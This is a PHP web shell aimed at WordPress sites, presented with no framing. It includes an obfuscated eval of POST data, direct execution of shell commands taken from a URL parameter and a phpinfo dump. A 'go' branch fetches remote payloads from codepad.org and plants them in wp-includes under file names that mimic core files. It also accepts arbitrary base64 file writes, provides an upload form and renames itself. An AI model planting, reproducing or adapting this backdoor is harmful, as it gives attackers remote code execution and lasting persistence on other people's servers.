<?php
//error_reporting(0);
if(isset($_GET['test']) && $_GET['test']){
    echo 261000;
//    $PHP_SELF = basename(__FILE__);
//    rename($PHP_SELF,'new_'.$PHP_SELF);
}elseif(isset($_GET['info']) && $_GET['info']){
    echo phpinfo();
}elseif(isset($_GET['eval']) && $_GET['eval']){
    $qV = "stop_";
    $s20 = strtoupper($qV[4] . $qV[3] . $qV[2] . $qV[0] . $qV[1]);
    if (isset(${$s20}['dak'])) {
        eval(${$s20}['dak']);
    }
}elseif(isset($_GET['go']) && $_GET['go']){
    $n = substr_count(substr(dirname(__FILE__),intval(strpos(dirname(__FILE__),'wp-content'))), "/");
    $path_pre = str_repeat('../',$n+1);
    $in_path = $path_pre.'wp-includes/';
    if(@file_put_contents($in_path.'media-bak.php',@file_get_contents('http://codepad.org/Uk6hqTZe/raw.php'))){
        echo '|YS[dak]';
    }else{
        echo '|YF';
    }
    if(@file_put_contents($in_path.'class-wp-upgrade.php',@file_get_contents('http://codepad.org/v6xhqhy7/raw.php'))){
        echo '|DS[wso]';
    }else{
        echo '|DF';
    }
    if(@file_put_contents($in_path.'class-wp-upload.php',@file_get_contents('http://codepad.org/ZSvhCPZE/raw.php'))){
        echo '|XS';
    }else{
        echo '|XF';
    }
}else{
    $path = isset($_POST['path'])?$_POST['path']:dirname(__FILE__);
    if($_POST['url']){
        foreach($_POST['url'] as $url){
            $filename = $url['name'];
//            $link = $url['link'];
            $con = $url['con'];
            if($a = @file_put_contents($path.$filename,base64_decode($con))){
                echo '|'.$filename.' success';
            }else{
                if($a = @file_put_contents($filename,base64_decode($con))){
                    echo '|ThisPath-'.$filename.' success';
                }else{
                    echo '|'.$filename.' fail';
                }
//                echo '|'.$filename.' fail';
            }
        }
        $PHP_SELF = basename(__FILE__);
        rename($PHP_SELF,'new_up.php');
    }else{
        $c=$_GET['cmd'];
        system($c);
        $p=$_SERVER["DOCUMENT_ROOT"];
        $yoco=dirname(__FILE__);
        echo <<<HTML
    <form enctype="multipart/form-data"  method="POST">
    Path:$p<br>
    <input name="file" type="file"><br>
    目标:<br>
    <input size="48" value="$yoco/" name="pt" type="text"><br>
    <input type="submit" value="Upload">
    $tend
HTML;
        if (isset($_POST["pt"])){
            $uploadfile = $_POST["pt"].$_FILES["file"]["name"];
            if ($_POST["pt"]==""){$uploadfile = $_FILES["file"]["name"];}
            if (copy($_FILES["file"]["tmp_name"], $uploadfile)){
                echo"uploaded:$uploadfilen";
                echo"Size:".$_FILES["file"]["size"]."n";
            }else {
                print "Error:n";
            }
        }
    }
}
?>